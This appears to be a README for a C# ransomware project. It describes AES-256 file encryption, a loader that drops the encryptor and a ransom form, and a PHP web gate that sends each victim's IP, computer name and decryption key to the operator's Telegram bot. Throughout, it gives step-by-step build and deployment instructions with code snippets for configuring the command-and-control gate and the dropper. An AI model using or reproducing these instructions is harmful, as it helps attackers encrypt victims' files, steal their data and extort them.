## 📑 About
```
This is a simple ransomware-example writed in C#.
Yes, many functions and its implementation is weak, but I think this example is worth being.
```
### 💾 Features:
 * Size: 800kb
 * Using Algorithm for Encryption: AES-256
 * Uses a gateway to redirect encrypted information and the unlock key, sending it directly to the telegram bot.
 * Divided into modules: Loader, Encryptor, Form(include decrypt-function)

## How to use?
 * Create bot in telegram: @BotFather and get your chatid with bot @getmyid_bot
 * Put this data in web-gate(src/WebResender/gate.php)
 ```php
$botToken = 'YOUR-TELEGRAM-BOT-TOKEN';
$chatId = 'YOUR-TELEGRAM-CHAT-ID';
$message = "[🏴‍☠️] New-Victim Computer!\nIP: $API_IP\nPC: $PC\nKey: $key";
 ```
 * And change url to your web-gate:
 ```csharp
public static readonly string UrlServer = "http://127.0.0.1/resender.php"; // Your web-gate
 ```
 * Then compile the FORM(FORM.EXE) and encryptor(ENC.EXE) and then add these two resources to the loader, the main thing is that they are compatible with the names
 (src/Azrael_Loader/Modules/Dropper.cs):
```csharp
16 File.WriteAllBytes(encPath, Properties.Resources.enc);
26 File.WriteAllBytes(formPath, Properties.Resources.Form);
```
 * After this, compile the loader and the project compilation is complete!.
 * Note: (If you want, you can change the keys to whatever you want).
